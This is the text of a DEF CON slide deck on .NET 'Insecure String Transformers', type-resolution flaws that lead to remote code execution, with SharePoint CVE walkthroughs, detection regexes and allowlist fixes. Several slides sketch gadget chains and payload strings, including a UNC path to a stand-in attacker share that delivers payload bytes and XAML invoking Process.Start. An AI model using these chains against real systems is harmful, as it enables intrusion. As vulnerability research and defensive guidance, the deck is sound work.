---
title: "Transformers Dark Side of the Type - Weaponizing the Conversion Layer"
speakers: ["Oleksandr Mirosh"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Oleksandr Mirosh - Transformers Dark Side of the Type - Weaponizing the Conversion Layer - Sideofthe v2.pdf"
pages: 52
sha256: "454f2216f3ba1c1f8f36421958500ad48f8ce18795042abae4c6073d92204226"
text_chars: 31456
ocr_pages: 0
has_ocr: false
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2"
converted_at: "2026-08-12T00:25:44Z"
---
# Transformers Dark Side of the Type - Weaponizing the Conversion Layer

**Speakers:** Oleksandr Mirosh  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Oleksandr Mirosh - Transformers Dark Side of the Type - Weaponizing the Conversion Layer - Sideofthe v2.pdf` (52 pages)

## Slide 1

**TRANSFORMERS** **`TYPE` DARK SIDE OF THE Weaponizing the Conversion Layer**

**Oleksandr Mirosh** `OpenText Fortify`

```
DEF CON 34
```

## Slide 2

```
$ whoami
```

### **Oleksandr Mirosh**

```
@olekmirosh
```

```
AT BLACK HAT & DEF CON BEFORE
```

**`2020` Room for Escape**

- **`2019` SSO Wars: The Token Menace** **`2017` Friday the 13th: JSON Attacks**

**`2016` JNDI/LDAP → RCE Dream Land**

###### **Security Researcher · OpenText Fortify**

18+ yrs — vuln research, reversing, pentest

serialization · auth protocols · JNDI

Transformation logic — Java & .NET

Numerous CVEs in enterprise apps & frameworks

```
2
```

## Slide 3

###### **`$ cat roadmap`**

### **Where we're going**

**01**

**It is not insecure deserialization ·** The reframing

#### **02**

**The transformation layer ·** String → object, without a serializer

**The attack surface ·** Five primitives, real gadgets **03**

**Real-world autopsy ·** From theory to RCE: SharePoint CVEs **04**

**Detection & defense ·** Hunt it, triage it, kill the class **05**

```
3
```

## Slide 4

###### **`$ cat 01-reframing`**

# **IT IS NOT INSECURE 01 DESERIALIZATION**

_The reframing_

```
4
```

## Slide 5

**`$ cat 01-reframing` Out of memory, and back**

Programs work with data as **objects** in memory To store or transmit them, they need a **format** : `XML · XAML · JSON · String · Binary · …`

Object ⇄ format is the job of **machinery** : `parsers · marshallers · serializers`

```
THE MACHINERY
BinaryFormatter
XmlSerializer
DataContractSerializer
Newtonsoft.Json
System.Text.Json
ObjectInputStream
Jackson
fastjson
```

```
5
```

## Slide 6

###### **`$ cat 01-reframing`**

###### **Coming back is the dangerous direction**

To rebuild an object, the machinery **picks a type** , then **runs code** to build it

Control the type — and you **choose the code**

**That's Insecure Deserialization.  Known for over a decade.**

**`2009 2012 2015 2017`** **_a decade of CVEs_** _Esser Forshaw Frohoff & Lawrence Muñoz & Mirosh_ **PHP Object Injection “Are You My Type?” “Marshalling Pickles” “Friday the 13th: JSON Attacks”** `type confusion, no gadget ysoserial · Java gadgets ysoserial.net · .NET gadgets`

```
6
```

## Slide 7

##### **`$ cat 01-reframing` The industry responded**

Stop the data from choosing the type `TypeNameHandling = None`

Constrain which types may load `SerializationBinder`

The dangerous serializers deprecated, then removed `BinaryFormatter`

Scanners learned the sinks `Deserialize()  ·  ReadObject()`

**The border was drawn around the serializer — and everyone learned to hunt inside it.**

```
7
```

## Slide 8

###### **`$ cat 01-reframing` But not everything goes through a serializer**

Big, structured objects need one

Simple objects **may travel as a type + a string**

**`"#FF0000"` →** **`Color`**

**`"3,5"` →** **`Point`**

**`"2026-06-29T13:42"` →** **`DateTime`**

**No format** `(XML, JSON, Binary)` **— just string No parser / serializer.**

**So — can this be Insecure Deserialization?**

```
8
```

## Slide 9

###### **`$ cat 02-transformation-layer`**

# **THE TRANSFORMATION 02 LAYER**

_String → object, without a serializer_

```
9
```

## Slide 10

**`$ cat 02-transformation-layer` The Transformation Layer**

**The code that turns a plain string into a constructed object — with no serializer in between.**

It performs the **same two operations** a serializer does: **select a type** · **populate an instance**

With **none of the machinery**

Developers rely on it constantly. It's rarely reviewed as a security boundary.

```
10
```

## Slide 11

###### **`$ cat 02-transformation-layer`**

##### **Not every conversion qualifies**

**`OUT`** _string as input · the type is fixed_ `BitConverter · XmlConvert · Convert.ChangeType` **`IN`** _string as input · a type may be resolved_ **`TypeConverter.ConvertFrom`** resolves the converter the type declares **`static Parse() / TryParse()`** the type is its own factory **`new T(string)`** the constructor is the trigger **`Parameterless ctor + accessors`** the members run the code **`Custom conversion logic`** defines its own shape **Complex serializers** that's Insecure Deserialization **`OUT OF SCOPE`**

```
11
```

## Slide 12

- **`$ cat 02-transformation-layer`**

- **When a transformer becomes insecure**

A Transformation Layer mechanism is an **Insecure String Transformer** when all four hold:

- **1** It accepts an **attacker-controlled string**

- **2** It **resolves a type** during conversion — from the string, metadata, or a separate parameter

- **3** It **instantiates or populates** an object of that resolved type

- **4** It **does not sufficiently restrict** which types may be resolved

**The first three make a transformer — the fourth makes it a weapon.**

```
12
```

## Slide 13

###### **`$ cat 02-transformation-layer` Same skeleton, different entrance**

**Data Stream** `bytes / JSON / XML`

Plain String

a text token

**Serializer** `type resolver / binder`

**Transformer** `type lookup / operator`

**Type Resolution attacker-controlled**

**Object Instantiation gadget execution**

###### **Two entrances. One attack.**

```
13
```

## Slide 14

**`$ cat 02-transformation-layer` Outside the serializer border**

No SAST rules

### **RCE**

**through a string conversion**

No warning in the documentation

###### **SharePoint**

No CWE category of its own

No hardening switch

**This isn't theory.**

unprivileged user · default config

```
CVE-2020-1460
CVE-2026-26106
CVE-2026-40357
CVE-2026-47294
CVE-2026-48560
```

```
Reproduced. Reported. Patched.
```

```
14
```

## Slide 15

###### **`$ cat 03-attack-surface`**

# **THE ATTACK 03 SURFACE**

_Five primitives, real gadgets_

```
15
```

## Slide 16

###### **`$ cat 03-attack-surface`**

##### **The attacker's inventory**

```
.NET FRAMEWORK
```

###### **Wide open**

The GAC (Global Assembly Cache): one machinewide store

Any installed and registered in GAC assembly, loadable by name, from any process

Inventory = the whole machine, not just what the app ships

###### **`MODERN .NET`**

###### **Narrowed — not closed**

No GAC. Reach = shared framework + what the app shipped (deps.json)

Many high-value gadgets still ride in with WindowsDesktop.App

One desktop reference deep in the graph pulls them back

###### **Availability is a property of the runtime — not the transformer.**

```
16
```

## Slide 17

###### **`$ cat 03-attack-surface`**

##### **Five mechanisms, one outcome**

|**`3.2`**|**`TypeConverter`**
the type selects the code|
|---|---|
|**`3.3`**|**`Parse()`**
the type is its own factory|
|**`3.4`**|**`new T(string)`**
the constructor is the trigger|
|**`3.5`**|**`Setters & getters`**
the members run the code|
|**`3.6`**|**`Custom logic`**
the transformer defines its own shape|
|**Input b**|**ecomes an instance of anattacker-chosen type.**|

```
17
```

## Slide 18

###### **`$ ./typeconverter cat 03-attack-surface TypeConverter` — the type selects the code**

A type may declare a `TypeConverter` via an attribute — a separate class that builds an instance from a string. `GetConverter` returns that converter, and it runs against the value.

● **`TypeConverter.cs`**

###### **`RESOLUTION`**

input becomes a Type

```
1
Type t = Type.GetType(typeName);
2
var conv = TypeDescriptor.GetConverter(t);
3
return conv.ConvertFromString(value);
```

###### **`SELECTION`**

the type selects the code _unique to TypeConverter_

**`Listing 3   C#`** _The TypeConverter sink: both arguments attacker-controlled_

```
EXECUTION
```

the call runs it

**The type doesn't convert — it delegates to its TypeConverter.**

→ `whitepaper §3.2 18`

## Slide 19

###### **`$ ./typeconverter cat 03-attack-surface` TypeConverter gadgets: where it starts**

Not new — the first were our **2017 Visual Studio converters** , each driving a deserializer behind ConvertFrom.

```
OUTBOUND GADGETS
```

Impacts **DNS · SSRF · NTLM relay** **`ImageSourceConverter`**

● **`ImageSourceConverter.cs`** `1 // any non-empty string is treated as a URI 2 var u = GetUriFromUriContext(context, value); 3 return BitmapFrame.CreateFromUriOrStream(u,…);`

any URL works — no filter

**`Listing 17   C#`** _ImageSourceConverter treats any string as a URI_

###### **`CursorConverter`**

only fetches *.cur and *.ani files

###### **_Every loadable assembly brings more._**

→ `whitepaper §3.2 19`

## Slide 20

**`$ ./typeconverter cat 03-attack-surface` First RCE TypeConverter gadget in .NET**

**`ResXFileRef`** (Soroush Dalili, 2018)

```
WHY IT IS SPECIAL
```

###### **`MECHANISM`**

First in the system libraries — earlier ones (2017 VS) were app-level

- **`"filename;typename;encoding"`**

- ① `resolve the named type`

Runs its own transformation, but from a stream — resolve + instantiate, seeded from bytes

- ② `FileStream over the path`

- ③ `build the type from bytes`

###### **Already outbound. For more, hand it a capable stream gadget.**

```
20
```

→ `whitepaper §3.2`

## Slide 21

###### **`$ ./typeconverter cat 03-attack-surface` The RCE stream gadget: ResourceSet**

**`ResourceSet`** is such a stream gadget: its constructor reads the incoming stream as a binary `.resources` file — and that file can carry a serialized object.

```
"…;System.Resources.ResourceSet;…"
```

→ `new ResourceSet(stream)`

- **→** **`ResourceReader stands up a BinaryFormatter`**

- **→** **`DeserializeObject clears the binder`**

- **→** **`BinaryFormatter.Deserialize(our bytes)` →** **`RCE`**

```
BINARYFORMATTER REACH
```

`.NET 6 — live .NET 7 — opt-in .NET 8 — throws then removed` _reaches modern .NET — narrowing with each release_

```
Soroush Dalili named three: ResourceSet · ResXResourceSet · ResourceReader
```

###### **Where BinaryFormatter is gone, ResXFileRef needs a different stream gadget.**

```
21
```

→ `whitepaper §3.2`

## Slide 22

###### **`$ ./typeconverter cat 03-attack-surface`**

##### **RCE without BinaryFormatter**

More RCE gadgets — **without BinaryFormatter.**

**`WorkflowServiceBehavior`** `System.WorkflowServices.dll` stream ctor copies the bytes → internal ctor reads WorkflowName during construction → DeSerizalizeDefinition → XOML deserializer **_the deserialize hides behind a property read_** **`XamlImageInfo`** `System.Activities.Presentation.dll` constructor → XamlReader.Load(stream) → **RCE** (§3.3) _GAC on Framework · absent from modern .NET (WF not ported) · app-referenced only._ **No default modern-.NET gadget found — yet.**

```
22
```

→ `whitepaper §3.2`

## Slide 23

##### **`$ ./parse cat 03-attack-surface Parse()` — the type is its own factory**

A type buildable from a string exposes a static `Parse` — `Int32` , `DateTime` , `Guid` all follow it. Resolve the type, invoke the `Parse` it declares.

● **`ParseSink.cs`** `1 Type t = Type.GetType(typeName); var parse = t.GetMethod("Parse", …, 2 typeof(string)); 3 return parse.Invoke(null, new[] { value });`

**`RESOLUTION`** input becomes a Type

```
EXECUTION
```

the type's own Parse runs it

**`Listing 18   C#`** _The Parse sink: reflective static Parse invocation_

_no converter — the type uses its own code_

**No attribute, no helper class — the method is already on the type.**

→ `whitepaper §3.3 23`

## Slide 24

###### **`$ ./parse cat 03-attack-surface`**

###### **The XAML factories**

**`XamlReader.Parse`** was one of our 2017 XAML sinks.

● **`XamlReader.cs`**

1
2
3
4

```
1
public static object Parse(string xamlText)
2
=> Parse(xamlText, useRestrictiveXamlReader: false);
```

- `3 // false` → `full XAML object writer builds the graph`

- `4 // XamlServices.Parse — same load via the System.Xaml writer`

**`Listing 20   C#`** _XamlReader.Parse opts out of the restricted reader_

**`ObjectDataProvider`** — the canonical XAML→RCE payload, carried in full by our 2017 work.

**`Availability`** — GAC on Framework · Microsoft.WindowsDesktop.App on modern .NET; reachable on both runtimes.

**One string — Parse builds the graph, and the graph runs the code.**

```
24
```

→ `whitepaper §3.3`

## Slide 25

###### **`$ ./parse cat 03-attack-surface` Wide reach, but no code execution**

The XAML factories are desktop-only — these two Parse gadgets reach further, without RCE.

```
StaticAssetsManifest.Parse
```

###### **`OUTBOUND · SSRF`**

```
ships in every ASP.NET Core app —the largest modern target
```

● **`StaticAssetsManifest.cs`** `1 using var fs = File.OpenRead(manifestPath); 2 return JsonSerializer.Deserialize<Manifest>(fs);` **`Listing 22   C#`** _opens a path, then JSON-deserializes a fixed type_ **`XDocument.Parse TIMING ORACLE`**

Every .NET app — the widest reach here. No type resolution, no XXE; parse time scales with the payload, so response time alone reveals the sink.

**No RCE — but two sinks: an SSRF, and a stopwatch oracle.**

```
25
```

→ `whitepaper §3.3`

## Slide 26

##### **`$ ./constructor cat 03-attack-surface new T(string)` — the constructor is the trigger**

Hand a string to a single-argument constructor. `new Uri(s)` , `new Version(s)` , `Guid` all build themselves from one string. No converter, no factory — the constructor is the conversion.

● **`CtorSink.cs`** `1 Type t = Type.GetType(typeName); 2 return Activator.CreateInstance(t, new[]{ value });` **`Listing 24   C#`** _The constructor sink: construction is the trigger_

**`RESOLUTION`** input becomes a Type **`EXECUTION`** the constructor runs _no method, no converter_

**Any type built from a single string is a candidate — and they are everywhere.**

```
26
```

→ `whitepaper §3.4`

## Slide 27

###### **`$ ./constructor cat 03-attack-surface`**

###### **Constructor gadgets: the string is a path**

###### A single-string constructor that opens an attacker-named path.

A **UNC path** turns any of them outbound — the ResXFileRef exposure, with no ResXFileRef.

```
FILE READ
```

###### **`StreamReader(path)`**

opens the file at construction

###### **`AssemblyDependencyResolver(path)`**

base framework — every modern .NET app

###### **`FileSystemWatcher(path)`**

Directory.Exists probes the host

###### **`FILE WRITE`**

###### **`StreamWriter(path)`**

creates the file, or truncates it to empty

###### **`ResourceWriter(path)`**

the same — disguised as resources

**reset a file → DoS** ; create one → flip an existence check. All at construction.

###### **Read, write, or reach out — all from a constructor handed a path.**

```
27
```

→ `whitepaper §3.4`

## Slide 28

###### **`$ ./constructor cat 03-attack-surface` The §3.2 RCE gadgets — no carrier**

Remember `ResourceSet` and `WorkflowServiceBehavior` ? In §3.2 they reached RCE only when ResXFileRef handed them a stream. Their string constructors reach the same code — with nothing in front.

**`new ResourceSet(string) opens the path` →** **`BinaryFormatter` →** **`RCE new WorkflowServiceBehavior(string) reads the file` →** **`XOML deserializer` →** **`RCE`**

_modern .NET, where BF is enabled .NET Framework only (WF not ported)_

**`What's new:` no ResXFileRef carrier and the path can be UNC.** `\\attacker\share\payload` **delivers the bytes over SMB.**

**Same RCE as §3.2 — a simpler primitive, delivered from your server.**

```
28
```

→ `whitepaper §3.4`

## Slide 29

###### **`$ ./accessors cat 03-attack-surface Setters & getters` — the members run the code**

The constructor does nothing here; the code lives in the members. The transformer creates the type with its parameterless constructor, then sets each property the attacker names — and every assignment runs its accessor.

● **`AccessorSink.cs`** `1 Type t = Type.GetType(typeName); 2 object obj = Activator.CreateInstance(t); 3 foreach (var (name, value) in inputPairs) 4 t.GetProperty(name).SetValue(obj, value);` **`Listing 30   C#`** _The accessor sink: create, then populate by attacker-named property_

**`RESOLUTION`** input becomes a Type **`EXECUTION`** each setter runs _every property is another trigger_

**Any accessor can run code — and the most capable one comes next.**

→ `whitepaper §3.5 29`

## Slide 30

###### **`$ ./accessors cat 03-attack-surface`**

###### **The king: ObjectDataProvider**

Its job is to construct an object and call a method on it for data binding — exposed entirely as settable properties. Any setter fires `Refresh` → `QueryWorker` , which can construct, invoke, or do both:

**`TWO PRIMITIVES, ONE GADGET`** ● **`ObjectDataProvider.cs`** `1 // QueryWorker — reached by any setter` **`CONSTRUCT`** `if (ObjectType)  Activator.CreateInstance(_objectType, 2` any type · your constructor args `ctorParams); 3 if (MethodName)  _objectType.InvokeMember(MethodName, 4 Public | Static | Instance | FlattenHierarchy,` **`INVOKE`** `5 _objectInstance, methodParams);` any method — static or instance · your

any method — static or instance · your parameters

**`Listing 32   C#`** _each setter guards its own reflection call_

**`Canonical payload`** ObjectInstance = **`Process`** · MethodName = **`Start` → RCE**

_GAC on Framework · Microsoft.WindowsDesktop.App on modern .NET — both runtimes._

###### **Construct anything, invoke anything — from nothing but assignments.**

→ `whitepaper §3.5 30`

## Slide 31

###### **`$ ./custom cat 03-attack-surface Custom logic` — the transformer defines its own shape**

The first four are the standard shapes — but not a closed list. A developer can convert a string however they like; whatever the implementation, if it meets the same conditions, it's an **Insecure String Transformer** .

```
NO API TO MATCH —ONLY A BEHAVIORAL QUESTION:
```

controlled input → a type resolved from it → code that builds it

The same pattern reappears in web model binders, config loaders, PowerShell's PSTypeConverter, etc.

**No API to grep — only behavior to read.**

→ `whitepaper §3.6 31`

## Slide 32

###### **`$ ./custom cat 03-attack-surface`**

###### **`EXAMPLE` a custom transformer that ends in XmlSerializer**

Microsoft's own `DataSet.ReadXml` looks like careful XML loading — it even disables DTD, so no XXE. The real danger is buried deeper in the transformation layer.

● **`DataSet.cs THE SCHEMA`** the attacker's XML declares each `1 ds.ReadXml(reader);` column's type `2` → `ConvertXmlToObject(this.DataType) 3` → `XmlSerializer.Deserialize(xmlReader)` **`XMLSERIALIZER`** builds the attacker's chosen type — **`Listing 34   C#`** _ReadXml builds each value as the type named in its schema_ unsafe → RCE **`CVE-2020-1147`** .NET Framework, SharePoint Server & Visual Studio — RCE

**Custom logic, in the wild — and it still meets every condition.**

→ `whitepaper §3.6 32`

## Slide 33

###### **`$ cat 04-autopsy`**

**REAL-WORLD 04 AUTOPSY**

###### _From theory to RCE: SharePoint CVEs_

```
33
```

## Slide 34

###### **`$ cat 04-autopsy`**

###### **CVE-2020-1460 — the seed**

The first time we reached RCE with no serializer at all — hunting SharePoint conversions in 2020, one resolved an attacker-named type and ran its converter.

The **§3.2 TypeConverter sink** , now inside SharePoint's `Insert()` .

● **`SPWorkflowDataSourceView.cs`** `1 string typeName = element.GetAttribute("Type"); 2 Type type = Type.GetType(typeName); 3 GetConverter(type).ConvertFromString(value);`

**`THE TYPE`** from the workflow XML

```
THE STRING
```

from the insert arguments

**`Listing 35   C#`** _SPWorkflowDataSourceView.Insert (CVE-2020-1460)_

_Both values under our control_

**No serializer anywhere — the seed of the whole class.**

→ `whitepaper §4.1 34`

## Slide 35

###### **`$ cat 04-autopsy`**

###### **From strings to RCE**

Everything the attacker supplies is two strings: planted where the sink reads them, reached as an unprivileged user. **`THE TYPE REACHING Insert()`** ① ● **`association.xml 1`** a config file carrying our Type `1 <Parameter Name="p" 2 Type="System.Resources.ResXFileRef"/>` **`2`** bound to a list by ID **`THE STRING`** ② ● **`3 insert-args.txt`** applied via AssociateWorkflowMarkup `1 p = "\\attacker\p.resx ; 2 ResourceSet ; enc"` **`4`** insert an item → Insert() fires

_→ the §3.2 chain: ResXFileRef → ResourceSet → BinaryFormatter → RCE_

**Two strings in the right place, and a hosted file does the rest.**

→ `whitepaper §4.1 35`

## Slide 36

###### **`$ cat 04-autopsy`**

###### **The fix — at type resolution**

No serializer to harden — Microsoft constrained which types the conversion may resolve.

###### **`BEFORE`**

● **`before.cs`**

```
THE ALLOWLIST
```

1

> `1 GetConverter(type).ConvertFromString(value);`

_resolves any attacker-named type_

```
bool · int · double · string
DateTime
+ three SPField types
```

###### **`AFTER`**

● **`after.cs`**

> `1 if (!IsAllowConvertType(type)) throw;`

> `2 GetConverter(type).ConvertFromString(value);`

```
ResXFileRef
```

```
not reachable now
```

_filters to the allowed types_

###### **Exactly the fix we recommend — problem solved?**

→ `whitepaper §4.1 36`

## Slide 37

###### **`$ cat 04-autopsy`**

##### **Six years later**

Microsoft fixed it correctly. We would expect that fix to reach everywhere it belongs. So we came back and checked.

```
CVE-2026-26106
```

```
CVE-2026-40357
```

```
CVE-2026-47294
```

```
CVE-2026-48560
```

_we will walk this one_

Four more IST bugs — each slips past the type restriction a different component sets, and each still reaches RCE.

**The bug got fixed. The class did not.**

```
37
```

→ `whitepaper §4.2`

## Slide 38

###### **`$ cat 04-autopsy`**

###### **A Parse sink in the markup parser**

A different component: the ASPX markup parser, converting a control property value through PropertyConverter.ObjectFromString. Two of its branches are Insecure String Transformers.

**`THE RESOLVED TYPE PICKS THE`** ● **`PropertyConverter.cs BRANCH`** `1 // TypeConverter branch  — the same vector as 4.1` and the attacker controls the type. `2 ret = converter.ConvertFromInvariantString(value); 3 // Parse branch  — we take this one` _SharePoint runs on .NET Framework —_ `4 ret = objType.GetMethod("Parse").Invoke(null, value);` _same runtime as 4.1._

**`Listing 39   C#`** _PropertyConverter.ObjectFromString (CVE-2026-47294)_

_But it looked hard to reach: SafeControl allowlists which control types a page may use._

###### **A reachable sink — behind an allowlist.**

→ `whitepaper §4.2 38`

## Slide 39

###### **`$ cat 04-autopsy`**

###### **A generic smuggles the type**

SafeControl checks the control type — not the types the parser resolves for its property values. That gap has been walked before.

**`CVE-2023-33160`** (Markus Wulftange) smuggled a dangerous type as a generic parameter — fixed for **regular-mode** ASPX. We walked the same gap in **design mode** .

```
THE MOVE
```

● **`ProxyRequestResponse.cs value has type T`** `1 // allowed: Namespace="Microsoft.SharePoint"` the parser converts it with T as objType `2 class ProxyRequestResponse<T> { 3 public T value { get; set; }` **`set T = XamlServices`** `4 }` its Parse is the §3.3 XAML sink

the parser converts it with T as objType

**`Listing 41   C#`** _the value property carries the type argument T_

###### **`allowlist passes`**

the outer type is allowed; T is never checked

###### **The allowlist checked the outer type — not its type argument.**

→ `whitepaper §4.2 39`

## Slide 40

###### **`$ cat 04-autopsy`**

###### **One call carries both**

Delivery is a single request to the design-mode service, ExecuteProxyUpdates — its UpdateTransaction carries the type and the payload.

① **`REGISTER DIRECTIVE` →** **`the type`**

● **`UpdateTransaction.xml`** `1 <Register TagPrefix="x" Namespace="Microsoft.SharePoint. 2 ProxyRequestResponse`1[[System.Xaml.XamlServices, ...]]" />` ② **`ASPX MARKUP` →** **`the payload`**

● **`page.aspx`**

> `1 <x:ProxyRequestResponse value="<ObjectDataProvider ...`

> `2 ...Process.Start... />" />`

**One request with the generic type and the XAML string — RCE**

→ `whitepaper §4.2 40`

## Slide 41

###### **`$ cat 04-autopsy`**

###### **The fix — a character restriction**

Microsoft added a character restriction on the Register directive, rejecting the generic-type syntax in the tag prefix and namespace.

- **`rejected.txt`**

```
1
Microsoft.SharePoint.ProxyRequestResponse`1[[System.Xaml.XamlServices, ...]]
2
// rejected by validation:   `   [   ]   etc
```

**So T can no longer be set to an attacker type** **_— by this route._**

-

- `•` **`CVE-2020-1460`** cut at the type _(at resolution)_

-

- `•` **`CVE-2026-47294`** cut at the delivery syntax _(before the parser)_

**Two cut points, one boundary: the type.**

→ `whitepaper §4.2 41`

## Slide 42

###### **`$ cat 05-detection-defense`**

# **DETECTION & 05 DEFENSE**

_Hunt it, triage it, kill the class_

```
42
```

## Slide 43

###### **`$ ./hunt cat 05-detection`**

###### **The neck: input becomes a Type**

Every one of the five passes through one operation before anything else — a type is resolved from the input. Find that, and you have found the transformer; the sink only decides what happens next.

● **`shared-hunt.txt`**

`# any type resolution, framework or hand-rolled — then read each hit: # is the string argument attacker-influenced? \.GetType\s*\(                          # Type.GetType, Assembly.GetType, ... \b\w*(Resolve|Create|Load)Type\w*\s*\(  # resolver / factory wrappers` **`Listing 46   regex`** _Shared hunt: type resolution (text search)_

- **Two-stage hunt**

   - the shared stage: input → Type — one query, all five, where the fix lands

   - the per-primitive sink — then the inverse gadget hunt

**One door in for all five — and no way to reach the code without it.**

```
43
```

→ `whitepaper §5.1`

## Slide 44

###### **`$ ./hunt cat 05-detection`**

###### **Five sinks, one shape**

Once the type is resolved, each primitive collapses to one short call. Learn the five shapes and the second stage of the hunt is a scan.

**`TypeConverter`** `GetConverter(type)` → `ConvertFromString(value)` **`Parse`** `GetMethod("Parse")` → `Invoke(null, value)` **`new T(string)`** `Activator.CreateInstance(type, value)` **`Setters / getters`** `CreateInstance(type)` → `SetValue(name, value) …` **`Custom logic`** `no signature — input` → `type` → `build  (behavioral)`

**Matching the sink finds the conversion — finding the gadget makes it an attack.**

```
44
```

→ `whitepaper §5.1`

## Slide 45

###### **`$ ./hunt cat 05-detection`**

###### **What makes a gadget dangerous**

A gadget looks like an ordinary conversion — until you see what it touches on the way: a load, a resolve, a parse, a fetch.

● **`dangerous-body.cs WHERE IT HIDES`** `Assembly.Load*             // load an assembly ConvertFrom override Type.GetType, Activator.CreateInstance  // resolve a type Xaml*                      // XamlReader, XamlServices, Baml* static Parse *Deserialize               // Xml, DataContract, Binary, Soap, ... single-string ctor File.Open*, new FileStream  // read a file, incl. UNC an accessor WebRequest, HttpClient      // outbound fetch` _etc._

**`Listing 47   C#`** _Examples of what may count as a dangerous gadget body_

**Last piece in — and it names the payoff: run, read, or reach out.**

→ `whitepaper §5.1 45`

## Slide 46

###### **`$ ./hunt cat 05-detection`**

###### **No code? Hunt the data**

Black-box, incident response, or a defender over logs — the transformer still leaves a trace: the type name sits in the data it consumes.

**`RECON — where conversion happens WHERE TO LOOK`** ● **`recon.txt`** `traffic System\.[A-Za-z0-9_.]+ ...   # a type name in a value position storage` **`Listing 62   regex`** _type names in data (mostly benign)_ `filesystem` **`ATTACK — a value carrying what it should not`** `logs` ● **`attack.txt`** `(ObjectDataProvider|ResXFileRef|XamlReader|XamlServices) # or markup / a UNC path / a URL where a scalar belongs` **`Listing 63   regex`** _gadget names, markup, external refs_

###### **The name of the type is the signature — whether you read code or read data.**

→ `whitepaper §5.2 46`

## Slide 47

###### **`$ ./hunt cat 05-detection`**

###### **Candidate to verdict**

A hunt produces candidates, not verdicts. Two facts settle almost everything: who controls the two inputs, and what the process can load.

● **`triage`**

- `[ ] attacker controls the type?`

- `[ ] attacker controls the value?`

- `[ ] any validation before conversion?`

- `[ ] which assemblies can the process load?`

- `[ ] a working gadget among them?`

- `[ ] crosses a trust boundary, unauthenticated?`

###### **`Tier 1` confirmed RCE**

both controlled · no restriction · gadget loadable → fix first

**`Tier 2` likely** one condition unnailed: bypassable check, or gadget unconfirmed

**`Tier 3` reachable** no working gadget found yet where the gadget hunt earns its place

**`Listing 65   Console`** _Triage checklist_

###### **The primitive does not set the priority — control and availability do.**

→ `whitepaper §5.3 47`

## Slide 48

###### **`$ ./fix cat 05-defense`**

###### **Kill the class — one condition**

Every finding in this talk reduces to one condition: external input chose which type was resolved. The defense is its negation — take that choice away from the input, and the class disappears.

- **① Gate the type before conversion**

a check before resolution is safest — resolution itself can carry risk.

- **② Limit to a known-good set**

a list of the types you expect, never a description of the ones you fear.

- **sanitize the name first, resolve second, never resolve a name you have not cleared**

**The choice was the whole vulnerability — take it back and nothing downstream can fire.**

```
48
```

## Slide 49

###### **`$ ./fix cat 05-defense`**

###### **Remove the choice**

The strongest fix is to not resolve from input at all. Often the type is not truly dynamic — pin it in code, from the route or a generic, and no input can choose it.

- **`resolve.cs`**

   - `1 // input-driven type — the whole class in one line 2 var obj = Convert(Type.GetType(input.TypeName), input.Value); 3 // fixed type — nothing to steer 4 var address = ParseAddress(input.Value);   // destination fixed in code`

**`Listing 66   C#`** _Input-driven vs. fixed destination type_

_Where it applies, this removes the surface rather than guarding it — possible far more often than the code suggests._

**If no input chooses the type — there is nothing to exploit.**

```
49
```

→ `whitepaper §5.4`

## Slide 50

###### **`$ ./fix cat 05-defense`**

###### **Restrict the choice**

When the type genuinely varies, restrict which names may resolve — matched against a known-good set, and checked before resolution.

- **`allowlist.cs`**

1
2
3
4
5

- `1 static readonly HashSet<string> Allowed = new()`

- `2 { "System.Int32", "System.DateTime", "MyApp.Models.CustomerAddress" }; 3 if (!Allowed.Contains(inputTypeName))`

- `4 throw new SecurityException($"Type not permitted: {inputTypeName}");`

- `5 Type t = Type.GetType(inputTypeName);   // reached only for an approved name`

**`Listing 67   C#`** _Exact-name allowlist at the sink_

**check the name before resolution — resolution itself may run code.**

**Not a defense:** a blocklist of known gadgets names only what is already known.

###### **Restrict which types can resolve — and the conversion layer goes quiet.**

→ `whitepaper §5.4 50`

## Slide 51

###### **`$ cat 06-conclusion`**

###### **Conclusion**

###### **① It is not Insecure Deserialization**

same root cause — attacker-controlled type resolution — reached with no serializer in sight.

**② One layer, five primitives**

TypeConverter, Parse, new T(string), accessors, custom logic — each turns a string into an attacker-chosen type.

- **③ A vulnerability class of its own**

**distinct** mechanism   · **its own** sinks   · **separate** signature   · **dedicated** fix

**— and still no CWE to name it.**

**The Transformation Layer has been a security boundary all along — it is time we treated it as one.**

```
51
```

## Slide 52

###### **`$ cat 06-questions`**

## **Questions?**

**Transformers: Dark Side of the Type**

_Weaponizing the Conversion Layer_

**`Whitepaper`** _— published alongside these slides_

###### **Oleksandr Mirosh**

**`@olekmirosh`** OpenText Fortify

```
52
```
